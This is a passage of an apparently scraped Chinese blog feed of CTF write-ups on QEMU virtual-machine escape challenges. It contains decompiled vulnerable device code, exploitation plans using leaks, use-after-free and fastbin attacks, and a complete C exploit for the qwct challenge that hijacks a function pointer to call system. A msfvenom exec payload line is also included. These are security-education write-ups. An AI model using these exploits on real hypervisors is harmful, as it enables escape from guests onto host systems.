int)(LODWORD(opaque-&gt;dma.src) - 0x40000); if ( v1 &amp; 4 ) &#123; v7 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque-&gt;enc)(v7, LODWORD(opaque-&gt;dma.cnt)); v3 = v7; &#125; else &#123; v3 = (uint8_t *)&amp;opaque-&gt;dma_buf[v2]; &lt;=======越界读 &#125; cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, 1); //读出来后传递给dma.dst v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; &#125; else &#123; v6 = (uint8_t *)&amp;opaque[0xFFFFFFDBLL].dma_buf[(unsigned int)opaque-&gt;dma.dst + 0x510]; //这里ida有点问题，其实这里是opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000] LODWORD(v3) = (_DWORD)opaque + opaque-&gt;dma.dst - 0x40000 + 0xBB8; cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0); // 越界写opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000] v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; if ( opaque-&gt;dma.cmd &amp; 4 ) &#123; v3 = (uint8_t *)LODWORD(opaque-&gt;dma.cnt); ((void (__fastcall *)(uint8_t *, uint8_t *, dma_addr_t))opaque-&gt;enc)(v6, v3, v5); v4 = opaque-&gt;dma.cmd; v5 = opaque-&gt;dma.cmd &amp; 4; &#125; &#125; opaque-&gt;dma.cmd = v4 &amp; 0xFFFFFFFFFFFFFFFELL; if ( v5 ) &#123; opaque-&gt;irq_status |= 0x100u; hitb_raise_irq(opaque, (uint32_t)v3); &#125; &#125;&#125; 利用：1、通过数组越界读泄露函数指针enc，由于这个qemu-system-x86_64的导入表有system，所以我们直接可以算出system2、用system覆盖enc函数3、写入opaque-&gt;dma_buf为要执行的命令，比如cat flag4、使用cmd=1|2|4时，调用enc函数，劫持控制流 QEMU Escape — vm_escape from 0CTF 2017 Finals没有公开下载的题目wp: https://blog.eadom.net/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/ 漏洞：1、对于phys_mem_write的len没有限制，导致可以越界读，同样用到了物理地址（需要将虚拟地址转化为物理地址）2、uaf漏洞，在vdd_mmio_write中可以设置dma_timer的过期时间，而在vdd_dma_timer中调用了opaque-&gt;dma_state-&gt;phys_mem_read/write，而pci_vdd_uninit函数会将dma_state释放；所以加入pci_vdd_uninit函数，在vdd_dma_timer之前调用，就是uaf了。 利用：1、通过phys_mem_write的越界读泄露程序地址还有libc地址（其实这里libc地址用不到，因为导入表有system了，只要程序地址加上偏移就行）2、将我们要执行的命令复制到opaque-&gt;dma_buf3、在vdd_mmio_write中可以设置dma_timer的过期时间4、往/sys/bus/pci/slots/4/power写入0，从而触发pci_vdd_uninit去free dma_state5、通过vdd_linear_write申请dma_state同样大小的内存，并用正确的值填充，具体代码如下，主要是将cmd设置为2，而phys_mem_read函数指针，设置为system，最后上面的dma_timer时间到了就会调用opaque-&gt;dma_state-&gt;phys_mem_read，从而让我们劫持控制流 1234567891011void put_fake_dma(void)&#123; struct dma fakedma; fakedma.cmd = 2; fakedma.phys_mem_read = system_addr; memcpy(pbuf, (void *)&amp;fakedma, sizeof(fakedma)); set_dmalen(0x330); set_dmastate_src(virt_to_phys(pbuf)); set_dmastate_dst(virt_to_phys(pbuf)); outb(0, VDB_PORT + 0);&#125; Defcon 2018 - EC3题目：https://github.com/o-o-overflow/chall-ec-3 漏洞：在mmio_write中，free的时候，没有将指针置空，导致了uaf漏洞，就跟常规的堆题一样，使用fastbin attack 1234567891011121314151617181920212223242526272829void __fastcall ooo_mmio_write_6E61F4(__int64 opaque, __int64 addr, __int64 value, unsigned int size)&#123; ...... ...... choose = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20; switch ( choose ) &#123; case 1u: free(gbuf_bss_1317940[((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16]); break; case 2u: v12 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16; v8 = addr_copy; memcpy((char *)gbuf_bss_1317940[v12] + (signed __int16)addr_copy, &amp;value_point[4], size); break; case 0u: v11 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16; if ( v11 == 15 ) &#123; for ( i = 0; i &lt;= 14; ++i ) gbuf_bss_1317940[i] = malloc(8LL * *(_QWORD *)&amp;value_point[4]); &#125; else &#123; gbuf_bss_1317940[v11] = malloc(8LL * *(_QWORD *)&amp;value_point[4]); &#125; break; &#125;&#125; 利用：1、在gbuf_bss_1317940中构0x7f绕过fastbin检查，比如在gbuf_bss_1317940[8]中存放malloc的返回值2、利用fastbin attack获得指向gbuf_bss_1317940的指针3、利用上面的指针，将free或者malloc的got地址写入到gbuf_bss_1317940[10]中4、通过edit gbuf_bss_1317940[10]即可修改got表5、最后调用free或者malloc即可劫持控制流，这里有个cat flag的后门函数，劫持到那即可 题目难点在于没有符号表，需要逆向，还有就是qemu自身也会申请或者释放0x60大小的堆，所以需要循环申请和循环修改提升成功率 强网杯 qwb 2019 final execchrome题目：https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/qwb-final-2019-ExecChrome 只有qemu-system-x86_64，可能需要修复需要的lib，需要的库超级多 漏洞：1、 nvme_mmio_read存在越界读漏洞，也是对索引没有限制 1234567uint64_t __cdecl nvme_mmio_read(NvmeCtrl *opaque, hwaddr addr, unsigned int size)&#123;............ memcpy(&amp;val, &amp;ptr[addr], sizea); return val;&#125; 2、 在nvme_mmio_write中的nvme_write_bar函数中故意添加了代码，也是导致NvmeCtrl-&gt;bar.cap之后的0-0x1000偏移任意地址写 12345678910111213141516171819if ( sizea == 2 ) &#123; *(_WORD *)((char *)&amp;NvmeCtrl-&gt;bar.cap + offset) = dataa; &#125; else if ( sizea &gt; 2 ) &#123; if ( sizea == 4 ) &#123; *(_DWORD *)((char *)&amp;NvmeCtrl-&gt;bar.cap + offset) = dataa; &#125; else if ( sizea == 8 ) &#123; *(uint64_t *)((char *)&amp;NvmeCtrl-&gt;bar.cap + offset) = dataa; &#125; &#125; else if ( sizea == 1 ) &#123; *((_BYTE *)&amp;NvmeCtrl-&gt;bar.cap + offset) = dataa; &#125; 漏洞利用：1、利用nvme_mmio_read进行程序地址以及堆地址的泄露，got表中存在system，所以程序地址加一个偏移就得到了system got的地址2、通过NvmeCtrl-&gt;bar.cap之后的0-0x1000偏移任意地址写，在bar后面的地址伪造一个admin_sq-&gt;timer,timer中的cb设置为system got的地址3、也是NvmeCtrl-&gt;bar.cap之后的0-0x1000偏移任意地址写，修改admin_cq-&gt;timer指针，指向上面伪造的timer 最后竟然通过只有通过重启动触发timer的调用… XNUCA 2018 SSD题目：https://github.com/w0lfzhang/vmescape/tree/master/xnuca 漏洞：还是常规的fastbin的uaf放到qemu里面，free的时候没将指针置空 12345678910111213141516171819202122232425262728xnucaState *__fastcall xnuca_timer(xnucaState *State)&#123; xnucaState *result; // rax int v2; // eax void **v3; // rbx result = (xnucaState *)(State-&gt;cmd_9D0 &amp; 4); if ( (_DWORD)result ) &#123; v2 = State-&gt;choose_9EC; switch ( v2 ) &#123; case 2: *(_DWORD *)((unsigned int)State-&gt;mallocSize + *(_QWORD *)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;index)) = State-&gt;value_9F8; break; case 3: free(*(void **)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;index)); break; case 1: v3 = (void **)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;index); *v3 = malloc((unsigned int)State-&gt;mallocSize); break; &#125; result = State; State-&gt;cmd_9D0 &amp;= 0xFFFFFFFB; &#125; return result;&#125; 漏洞利用：通过fastbin attack伪造fd指向free got后，修改free got为system plt的地址，最后调用free即可 跟defcon ec3比，只不过这个有符号，但是给这个加了点限制，才能进入漏洞代码： 1、首先调用xnuca_timer，先得调用xnuca_set_timer初始化计时器2、而进入计时器的初始化，需要State-&gt;cmd_9D0 &amp; 1 == 1，那就需要通过xnuca_auth 5次后设置a1-&gt;cmd_9D0 |= 1u;3、最后进入xnuca_timer中的漏洞代码，需要cmd_9D0 &amp; 4 == 1，这个可以通过调用xnuca_send_request设置，不过也得必须调用xnuca_send_request来传递我们的参数 跟defcon ec3不一样的还有malloc的返回值不是0x7fxxxxxxx，所以指向直接fd劫持到got表，修改free了 强网杯2019线上赛qwct题目：https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/qwb-preliminary-2019-qwct 漏洞： 通过strlen()到\\x00才截止可以越界读 123456789101112131415v18 = strlen((const char *)opaque-&gt;crypto.output_buf); v19 = size_copy == 1; v20 = size_copy == 1; if ( addr &lt; v18 + 0x3000 &amp;&amp; v19 ) &#123; if ( (opaque-&gt;crypto.statu - 6) &amp; 0xFFFFFFFFFFFFFFFDLL ) &#123; result = -1LL; &#125; else &#123; v22 = *((_BYTE *)opaque + addr - 0x15C0); result = v22; &#125; return result; aes_encrypt_function和aes_decrypto_function都有8字节溢出 12345678910111213141516171819202122232425262728293031 if ( v7 ) &#123; v9 = 0LL; do &#123; v10 = (__int64)&amp;output_buf[v9]; v11 = (__int64)&amp;v4[v9]; v9 += 16LL; AES_ecb_encrypt(v11, v10, (__int64)&amp;aes, 0LL); &#125; while ( v7 &gt; v9 ); v18 = 0LL; v19 = 0; v12 = 0; for ( i = 0LL; ; v12 = *((_BYTE *)&amp;v18 + (i &amp; 7)) ) &#123; v14 = output_buf[i] ^ v12; v15 = i++; *((_BYTE *)&amp;v18 + (v15 &amp; 7)) = v14; if ( v7 == i ) break; &#125; v16 = v18; &#125; else &#123; v16 = 0LL; &#125; *(_QWORD *)&amp;output_buf[v7] = v16; return 1;&#125; 漏洞利用：1、mmio_write不能直接填充output_buf，所以我们通过调用stream_encrypto_fucntion去填充疑惑后都是非0的，那么strlen计算就会超过0x800，那就可以越界读，读取到函数指针stream_encrypto_fucntion的地址，从而算出程序的基址，及system_plt地址 2、虽然aes_encrypt_function和aes_decrypto_function都有8字节溢出，但是我们需要控制output_buf的值，我们才能最终控制计算出来的值（即循环异或，第一次是异或0，第二次是异或上一次的结果），直接通过aes_encrypt_function利用有点困哪，我们难以控制加密后的值。但是我们先aes加密，再通过aes解密，那么我们就可以精准控制解密结果了。 题外话关注下有没常见套路整数溢出漏洞什么的 附录关于exp传到qemu中远程环境 telnet：telnet XXX.XXX.XXX.XXX 6666 &gt; pwn.b64 &amp;&amp; base64 -d pwn.b64 &gt; pwn 有无wget 实在不行难道 echo？ 本地环境 1、scp2、sftp3、文件系统打包 1234567//解压cpio -idmv &lt; rootfs.img//编译+打包gcc -o exp -static exp.ccp ./exp ./rootfs/rootcd ./rootfs &amp;&amp; find . | cpio -o --format=newc &gt; ../XXX 调用计算器，浏览器1234// char *para=&quot;google-chrome –no-sandbox file:///home/qwb/Desktop/success.mp4&quot;;// &gt;&gt;&gt; from pwn import *// &gt;&gt;&gt; map(hex, unpack_many(&quot;gnome-calculator&quot;))// [&apos;0x6d6f6e67&apos;, &apos;0x61632d65&apos;, &apos;0x6c75636c&apos;, &apos;0x726f7461&apos;] msfvenom -p linux/x64/exec cmd=”export DISPLAY=:0.0&amp;&amp;xcalc” -f dw","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"CTF QEMU 虚拟机逃逸之强网杯2019线上赛qwct","slug":"CTF QEMU 虚拟机逃逸之强网杯2019线上赛qwct","date":"2020-01-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2020/01/13/CTF QEMU 虚拟机逃逸之强网杯2019线上赛qwct/","link":"","permalink":"https://www.giantbranch.cn/2020/01/13/CTF QEMU 虚拟机逃逸之强网杯2019线上赛qwct/","excerpt":"","text":"熟悉题目启动脚本，是qwb设备 12#!/bin/bash./qemu-system-x86_64 -initrd ./rootfs.cpio -nographic -kernel ./vmlinuz-5.0.5-generic -L pc-bios/ -append &quot;priority=low console=ttyS0&quot; -device qwb -monitor /dev/null 一开始在16.04，18.04上尝试启动，结果安装的依赖库好像版本不太符合要求，最终在19.04上面安装依赖库即可启动了，看来强网杯还是紧跟最新的系统啊 tips：缺少库可以用 apt-cache search 去查找后安装 启动起来，先看pci设备 12345678/ # lspci00:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:884800:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:1111 再看看qwb_class_init函数，可以确定是00:04.0 Class 00ff: 1234:8848 12345678910111213141516171819202122232425void __fastcall qwb_class_init(ObjectClass_0 *a1, void *data)&#123; ObjectClass_0 *v2; // rbx ObjectClass_0 *v3; // rax v2 = object_class_dynamic_cast_assert( a1, (const char *)&amp;implements_type, &quot;/home/ctflag/Desktop/QWB/online/QMCT/qemu_qwb/hw/misc/qwb.c&quot;, 497, &quot;qwb_class_init&quot;); v3 = object_class_dynamic_cast_assert( a1, &quot;pci-device&quot;, &quot;/home/ctflag/Desktop/QWB/online/QMCT/qemu_qwb/hw/misc/qwb.c&quot;, 498, &quot;qwb_class_init&quot;); BYTE4(v3[2].object_cast_cache[0]) = 0x10; HIWORD(v3[2].object_cast_cache[0]) = 0xFF; v3[1].unparent = (ObjectUnparent *)pci_qwb_realize; v3[1].properties = (GHashTable *)pci_qwb_uninit; LOWORD(v3[2].object_cast_cache[0]) = 0x1234; WORD1(v3[2].object_cast_cache[0]) = 0x8848u; v2[1].type = (Type)((_QWORD)v2[1].type | 0x80LL);&#125; 漏洞代码分析这个很多多线程的锁与解锁，所以还是比较难看的 qwb_mmio_read当addr为0-10的功能，其他情况继续看下面 123456789101112130、初始化crypt_key，input_buf，output_buf（crypto.statu的最低的1，3位为1就什么也不做）1、crypto.statu为0或2，就设置为32、crypto.statu为0或4，就设置为13、crypto.statu为3，就设置为44、crypto.statu为1，就设置为25、crypto.statu为2或4，设置crypto.encrypt_function为aes_encrypt_function6、crypto.statu为2或4，设置crypto.decrypt_function为aes_decrypto_function7、crypto.statu为2或4，设置crypto.encrypt_function为stream_encrypto_fucntion8、crypto.statu为2或4，设置crypto.decrypt_function为stream_decrypto_fucntion9、crypto.statu为2或4，statu设置为5，调用加密函数opaque-&gt;crypto.encrypt_function(opaque-&gt;crypto.input_buf,opaque-&gt;crypto.output_buf,opaque-&gt;crypto.crypt_key); 其实到qwb_encrypt_processing_thread将statu设置为610、crypto.statu为2或4，statu设置为7，调用解密函数opaque-&gt;crypto.decrypt_function(opaque-&gt;crypto.input_buf,opaque-&gt;crypto.output_buf,opaque-&gt;crypto.crypt_key);其实到qwb_decrypt_processing_thread将statu设置为8 代码太长就只贴default的代码，下面把lock和unlock的代码去掉了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061default: size_copy = size; if ( addr &lt;= 0x2FFF ) &#123; if ( addr &lt;= 0x1FFF ) &#123; if ( addr &lt;= 0xFFF ) &#123;LABEL_37: return -1LL; &#125; v20 = size_copy == 1; goto LABEL_35; &#125; v20 = size == 1; &#125; else &#123; v18 = strlen((const char *)opaque-&gt;crypto.output_buf); v19 = size_copy == 1; v20 = size_copy == 1; if ( addr &lt; v18 + 0x3000 &amp;&amp; v19 ) &#123; if ( (opaque-&gt;crypto.statu - 6) &amp; 0xFFFFFFFFFFFFFFFDLL ) &#123; result = -1LL; &#125; else &#123; v22 = *((_BYTE *)opaque + addr - 0x15C0); result = v22; &#125; return result; &#125; &#125; if ( addr &lt; strlen((const char *)opaque-&gt;crypto.input_buf) + 0x2000 &amp;&amp; v20 ) &#123; if ( opaque-&gt;crypto.statu == 2 ) &#123; v23 = *((_BYTE *)opaque + addr - 0xDC0); result = v23; &#125; else &#123; result = -1LL; &#125; return result; &#125;LABEL_35: if ( addr &gt;= strlen((const char *)opaque-&gt;crypto.crypt_key) + 0x1000 || !v20 ) goto LABEL_37; if ( opaque-&gt;crypto.statu == 4 ) &#123; v24 = *((_BYTE *)opaque + addr - 0x5C0); result = v24; &#125; else &#123; result = -1LL; &#125; return result; 功能如下，根据addr的值进行选择： 1230x1000-0x1fff： size为1，而且addr&lt; strlen((const char *)opaque-&gt;crypto.crypt_key) + 0x1000,才能进入下一步，下一步要opaque-&gt;crypto.statu == 4,最终才读取*((_BYTE *)opaque + addr - 0x5C0)的值0x2000-0x2fff: 条件基本跟上面相似，statu为2，读取*((_BYTE *)opaque + addr - 0xDC0);0x3000以上： 条件基本跟上面相似，status为6或8，读取*((_BYTE *)opaque + addr - 0x15C0); 此外，还有重要的是，我们调用了下面的才能进入addr大于0x3000的分支 12qwb_decrypt_processing_thread将status设置为8qwb_encrypt_processing_thread将status设置为6 qwb_mmio_write的话如下，没什么漏洞，只是设置crypt_key和input_buf 12345678910111213141516171819202122232425262728293031void __fastcall qwb_mmio_write(QwbState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; char v4; // r12 QemuMutex_0 *v5; // r13 int v6; // edx if ( size == 1 ) &#123; v4 = val; if ( addr - 0x1000 &lt;= 0x7FF ) &#123; v5 = &amp;opaque-&gt;crypto_statu_mutex; if ( opaque-&gt;crypto.statu == 3 ) &#123; *((_BYTE *)opaque + addr - 0x5C0) = v4; &#125; v6 = 435; &#125; else &#123; if ( addr - 0x2000 &gt; 0x7FF ) return; v5 = &amp;opaque-&gt;crypto_statu_mutex; if ( opaque-&gt;crypto.statu == 1 ) &#123; *((_BYTE *)opaque + addr - 0xDC0) = v4; &#125; v6 = 447; &#125; &#125;&#125; 那么漏洞是什么？1、qwb_mmio_read在填满output_buf的时候，strlen会大于0x800，在读取output_buf的时候，可以越界读，读取到函数指针 2、还有就是在aes_encrypt_function和aes_decrypto_function中，以aes_encrypt_function为例，最后会各种异或操作一波，由于v7最多可以到0x800，最终将溢出output_buf，溢出8个字节，可以覆盖encrypt_function指针 1*(_QWORD *)&amp;output_buf[v7] = v25; 漏洞利用保护措施，全开 12345678root@ubuntu:~/qemu_escape/qwb-preliminary-2019-qwct# checksec ./qe*[*] &apos;/root/qemu_escape/qwb-preliminary-2019-qwct/qemu-system-x86_64&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 利用思路：1、mmio_write不能直接填充output_buf，所以我们通过调用stream_encrypto_fucntion去填充疑惑后都是非0的，那么strlen计算就会超过0x800，那就可以越界读，读取到函数指针stream_encrypto_fucntion的地址，从而算出程序的基址，及system_plt地址 2、虽然aes_encrypt_function和aes_decrypto_function都有8字节溢出，但是我们需要控制output_buf的值，我们才能最终控制计算出来的值（即循环异或，第一次是异或0，第二次是异或上一次的结果），直接通过aes_encrypt_function利用有点困哪，我们难以控制加密后的值。但是我们先aes加密，再通过aes解密，那么我们就可以精准控制解密结果了。 123456789101112131415161718192021//下面是aes_decrypto_function的部分代码 v18 = 0LL; v19 = 0; v12 = 0; for ( i = 0LL; ; v12 = *((_BYTE *)&amp;v18 + (i &amp; 7)) ) &#123; v14 = output_buf[i] ^ v12; v15 = i++; *((_BYTE *)&amp;v18 + (v15 &amp; 7)) = v14; if ( v7 == i ) break; &#125; v16 = v18; &#125; else &#123; v16 = 0LL; &#125; *(_QWORD *)&amp;output_buf[v7] = v16; return 1;&#125; 最终exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269// -*- coding: utf-8 -*-// @Date : 2020-01-15// @Author : giantbranch// @Link : http://www.giantbranch.cn/// @tags : #include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;assert.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;// #define MAP_SIZE 4096UL#define MAP_SIZE 0x100000#define MAP_MASK (MAP_SIZE - 1)char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;unsigned char* mmio_base;unsigned char* getMMIOBase()&#123; int fd; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(mmio_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; return mmio_base;&#125;void mmio_write(uint64_t addr, uint64_t value)&#123; *((uint8_t*)(mmio_base + addr)) = value;&#125;uint32_t mmio_read(uint64_t addr)&#123; return *((uint8_t*)(mmio_base + addr));&#125;void init()&#123; mmio_read(0);&#125;void set_status(uint32_t value)&#123; if (value == 1) &#123; mmio_read(2); &#125;else if (value == 2) &#123; mmio_read(4); &#125;else if (value == 3) &#123; mmio_read(1); &#125;else if (value == 4) &#123; mmio_read(3); &#125;&#125;void set_enc_aes()&#123; mmio_read(5);&#125;void set_dec_aes()&#123; mmio_read(6);&#125;void set_enc_stream()&#123; mmio_read(7);&#125;void set_dec_stream()&#123; mmio_read(8);&#125;void call_encrypt_function()&#123; mmio_read(9);&#125;void call_decrypt_function()&#123; mmio_read(10);&#125;uint8_t read_crypt_key(uint32_t offset)&#123; return mmio_read(0x1000+offset);&#125;uint8_t read_input_buf(uint32_t offset)&#123; return mmio_read(0x2000+offset);&#125;// b *$rebase(0x4D2907) uint8_t read_output_buf(uint32_t offset)&#123; return mmio_read(0x3000+offset);&#125;void write_crypt_key(uint32_t offset, uint8_t value)&#123; mmio_write(0x1000+offset,value);&#125;void write_input_buf(uint32_t offset, uint8_t value)&#123; mmio_write(0x2000+offset,value);&#125;uint64_t leak_enc_fucntion()&#123; int i = 0; uint64_t enc_fucntion_addr = 0, tmp; for (i = 0; i &lt; 6; i++)&#123; // printf(&quot;leak 0x800+%d : %lx\\n&quot;, i, read_output_buf(0x800+i)); tmp = read_output_buf(0x800+i); tmp &lt;&lt;= (8*i); enc_fucntion_addr |= tmp; &#125; return enc_fucntion_addr;&#125;int main(int argc, char const *argv[])&#123; uint64_t system_plt_off = 0x2ADF80, system_plt = 0; uint64_t stream_encrypto_off = 0x4D2A20, stream_encrypto_addr = 0, bin_addr = 0; uint8_t enc_output_data[0x800]; int i = 0; getMMIOBase(); printf(&quot;mmio_base Resource0Base: %p\\n&quot;, mmio_base); /***************************/ /*leak stream_encrypto_addr*/ /***************************/ //init status, crypt_key, input_buf, output_buf init(); // fill input_buf with 0x60 set_status(1); for (i = 0; i &lt; 0x800; i++)&#123; write_input_buf(i, 0x60); &#125; // fill crypt_key // b *$rebase(0x4D2090) set_status(2); // b *$rebase(0x4D1F80) set_status(3); for (i = 0; i &lt; 0x800; i++)&#123; write_crypt_key(i, 0x6); &#125; // set encrypt_function with stream_encrypto_fucntion // b *$rebase(0x4D21A0) set_status(4); set_enc_stream(); // call encrypt_function to fill output_buf // b *$rebase(0x4D1D6D) call_encrypt_function(); usleep(100); //leak stream_encrypto_addr = leak_enc_fucntion(); bin_addr = stream_encrypto_addr - stream_encrypto_off; system_plt = bin_addr + system_plt_off; printf(&quot;stream_encrypto_addr: %lx\\n&quot;, stream_encrypto_addr); printf(&quot;bin_addr: %lx\\n&quot;, bin_addr); printf(&quot;system_plt: %lx\\n&quot;, system_plt); /***************************/ /*overwrite enc pointer*/ /***************************/ // now state is 6 (qwb_encrypt_processing_thread set opaque-&gt;crypto.statu = 6) // so we must call init to restart, otherwise we can&apos;t do nothing //init status, crypt_key, input_buf, output_buf init(); // fill input_buf with 0x6f set_status(1); for (i = 0; i &lt; 0x800; i++)&#123; write_input_buf(i, 0x60); &#125; //通过对aes_dec最后代码的调试，发现最后结果为0x0，那么肯定是0x6060606060606060^0x6060606060606060了 //所以我们设置最后8字节为 system_plt ^ 0x6060606060606060，计算出来就是system_plt了 for (i = 0x7f8; i &lt; 0x800; i++)&#123; write_input_buf(i, ((uint8_t*)&amp;system_plt)[i&amp;7]^0x60); &#125; // fill crypt_key set_status(2); set_status(3); // size must 0x10 , and key not important for (i = 0; i &lt; 0x10; i++)&#123; write_crypt_key(i, 0x6); &#125; // set enc function set_status(4); set_enc_aes(); call_encrypt_function(); usleep(100); //state now is 6 // read enc output_buf for (i = 0; i &lt; 0x800; i++)&#123; enc_output_data[i] = read_output_buf(i); &#125; /**** call aes_decrypto_function to overwrite enc pointer ****/ init(); // fill input_buf with enc_output_data set_status(1); for (i = 0; i &lt; 0x800; i++)&#123; write_input_buf(i, enc_output_data[i]); &#125; // set the same key set_status(2); set_status(3); // size must 0x10 for (i = 0; i &lt; 0x10; i++)&#123; write_crypt_key(i, 0x6); &#125; // set dec function set_status(4); set_dec_aes(); //b *$rebase(0x4D2A30) aec_dec //b *$rebase(0x4D2B1E) output //b *$rebase(0x4D2B41) overwrite call_decrypt_function(); usleep(100); /***************************/ /*call enc pointer ———— just call system*/ /***************************/ init(); // set system cmd: just set input_buf char *cmd = &quot;gnome-calculator&quot;; // fill input_buf with cmd set_status(1); for (i = 0; i &lt; strlen(cmd); i++)&#123; write_input_buf(i, cmd[i]); &#125; //call enc set_status(2); call_encrypt_function(); return 0;&#125; 最终效果： cat flag: 弹计算器: 参考https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/qwb-preliminary-2019-qwct","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD","slug":"CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD","date":"2020-01-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2020/01/08/CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD/","link":"","permalink":"https://www.giantbranch.cn/2020/01/08/CTF QEMU 虚拟机逃逸之XNUCA 2018 SSD/","excerpt":"","text":"熟悉题目先看启动脚本，那应该就是xnuca设备了 1234567891011#!/bin/bash./qemu-system-x86_64 \\ -initrd ./rootfs.img \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append &quot;console=ttyS0 root=/dev/sda oops=panic panic=1&quot; \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/loacl/share/qemu \\ -L ./pc-bios \\ -nographic \\ -device xnuca 启动后直接root登录就可以了，查看pci设备 12345678# lspci00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:111100:01.0 Class 0601: 8086:700000:04.0 Class 00ff: 1234:11e9 通过查看xnuca_class_init函数，可以知道xnuca对应00:04.0 Class 00ff: 1234:11e9 123456789101112131415161718__int64 __fastcall xnuca_class_init(__int64 a1)&#123; __int64 result; // rax result = object_class_dynamic_cast_assert( a1, &quot;pci-device&quot;, &quot;/mnt/hgfs/Workbench/CTF/xnuca/qemu/hw/misc/xnuca.c&quot;, 183LL, &quot;xnuca_class_init&quot;); *(_QWORD *)(result + 176) = pci_xnuca_realize; *(_QWORD *)(result + 184) = pci_xnuca_uninit; *(_WORD *)(result + 208) = 0x1234; *(_WORD *)(result + 210) = 0x11E9; *(_BYTE *)(result + 212) = 0; *(_WORD *)(result + 214) = 0xFF; return result;&#125; 代码分析先看read，就是读取0x9D0和0x9DC偏移的数据 123456789101112__int64 __fastcall xnuca_mmio_read(__int64 State, unsigned __int8 addr)&#123; _BYTE v3[12]; // [rsp+20h] [rbp-14h] *(_DWORD *)&amp;v3[8] = 0; *(_QWORD *)v3 = addr; if ( addr == 0x10 ) return *(unsigned int *)(State + 0x9DC); if ( addr == 0x20 ) *(_QWORD *)&amp;v3[4] = *(unsigned int *)(State + 0x9D0); return *(_QWORD *)&amp;v3[4];&#125; 再看write，有3个功能，分别是xnuca_set_timer、xnuca_send_request、xnuca_auth 123456789101112131415161718192021222324252627282930__int64 __fastcall xnuca_mmio_write(__int64 State, int addr, unsigned int value, int size)&#123; __int64 result; // rax int v5; // [rsp+10h] [rbp-30h] v5 = addr; result = State; if ( size == 4 || size == 8 ) &#123; result = (unsigned __int8)addr; if ( (unsigned __int8)addr == 0x20 ) &#123; result = xnuca_set_timer(State); &#125; else if ( (_DWORD)result == 0x30 ) &#123; result = xnuca_send_request( State, (unsigned __int64)(addr &amp; 0xF00) &gt;&gt; 8, (unsigned __int64)((unsigned __int16)addr &amp; 